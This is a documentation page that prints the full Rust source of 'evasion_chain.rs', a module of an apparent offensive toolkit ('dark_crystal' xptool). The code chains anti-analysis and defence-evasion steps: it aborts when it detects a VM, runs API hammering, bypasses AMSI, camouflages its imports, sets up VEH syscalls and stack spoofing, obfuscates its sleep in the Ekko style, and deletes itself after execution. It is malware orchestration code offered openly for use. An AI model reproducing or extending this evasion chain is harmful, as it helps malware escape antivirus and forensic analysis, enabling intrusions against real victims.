# evasion_chain

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/tools/xptool/src/evasion_chain.rs` |
| **Lines** | 128 |
| **Cards** | T022-architecture |
| **Role** | Evasion chain builder |
| **Unsafe blocks** | 1 |

## Types

### struct `EvasionChain` (line 4)

## Public API

### `new` (line 9)
```rust
pub fn new(profile: EvasionProfile) -> Self
```

### `execute_preparation` (line 13)
```rust
pub fn execute_preparation(&self) -> Result<()>
```

### `execute_post_execution` (line 45)
```rust
pub fn execute_post_execution(&self) -> Result<()>
```

## Internal Functions

- `run_anti_vm` (line 57)
- `run_hammering` (line 71)
- `run_amsi_bypass` (line 79)
- `run_iat_camouflage` (line 87)
- `run_veh_init` (line 95)
- `run_stack_spoof_init` (line 105)
- `run_ekko_sleep` (line 113)
- `run_self_delete` (line 121)

## Key Dependencies

- `use crate::config::EvasionProfile;`
- `use anyhow::{anyhow, Result};`

## Full Source

```rust
use crate::config::EvasionProfile;
use anyhow::{anyhow, Result};

pub struct EvasionChain {
    profile: EvasionProfile,
}

impl EvasionChain {
    pub fn new(profile: EvasionProfile) -> Self {
        Self { profile }
    }

    pub fn execute_preparation(&self) -> Result<()> {
        if self.profile.debug {
            println!("[*] Iniciando cadena de evasion...");
        }

        if self.profile.anti_vm {
            self.run_anti_vm()?;
        }

        if self.profile.hammering {
            self.run_hammering()?;
        }

        if self.profile.amsi_hbp {
            self.run_amsi_bypass()?;
        }

        if self.profile.iat_camou {
            self.run_iat_camouflage()?;
        }

        if self.profile.veh_syscalls {
            self.run_veh_init()?;
        }

        if self.profile.stack_spoof {
            self.run_stack_spoof_init()?;
        }

        Ok(())
    }

    pub fn execute_post_execution(&self) -> Result<()> {
        if self.profile.ekko {
            self.run_ekko_sleep()?;
        }

        if self.profile.self_delete {
            self.run_self_delete()?;
        }

        Ok(())
    }

    fn run_anti_vm(&self) -> Result<()> {
        if self.profile.debug {
            println!("[*] Ejecutando Anti-VM checks...");
        }
        let vm_detected = crystalclearlib::evade_vm::check_vm();
        if vm_detected {
            if self.profile.debug {
                println!("[!] VM detectada - abortando");
            }
            return Err(anyhow!("VM detectada"));
        }
        Ok(())
    }

    fn run_hammering(&self) -> Result<()> {
        if self.profile.debug {
            println!("[*] Ejecutando API hammering...");
        }
        crystalclearlib::api_hammering::hammer(0xCAFEBABE);
        Ok(())
    }

    fn run_amsi_bypass(&self) -> Result<()> {
        if self.profile.debug {
            println!("[*] Instalando AMSI HBP...");
        }
        crystalclearlib::amsi_hbp::install_amsi_hbp();
        Ok(())
    }

    fn run_iat_camouflage(&self) -> Result<()> {
        if self.profile.debug {
            println!("[*] Aplicando IAT camouflage...");
        }
        crystalclearlib::iat_camouflage::apply_camouflage(4);
        Ok(())
    }

    fn run_veh_init(&self) -> Result<()> {
        if self.profile.debug {
            println!("[*] Inicializando VEH syscalls...");
        }
        unsafe {
            crystalclearlib::evasion::veh::initialize_veh()?;
        }
        Ok(())
    }

    fn run_stack_spoof_init(&self) -> Result<()> {
        if self.profile.debug {
            println!("[*] Inicializando stack spoofing...");
        }
        crystalclearlib::evasion::advanced_stack::init(0);
        Ok(())
    }

    fn run_ekko_sleep(&self) -> Result<()> {
        if self.profile.debug {
            println!("[*] Ejecutando Ekko sleep obfuscation...");
        }
        crystalclearlib::ekko_variants::ekko_sleep_dynamic(2000);
        Ok(())
    }

    fn run_self_delete(&self) -> Result<()> {
        if self.profile.debug {
            println!("[*] Ejecutando self-deletion...");
        }
        let _ = crystalclearlib::self_deletion::delete_self();
        Ok(())
    }
}

```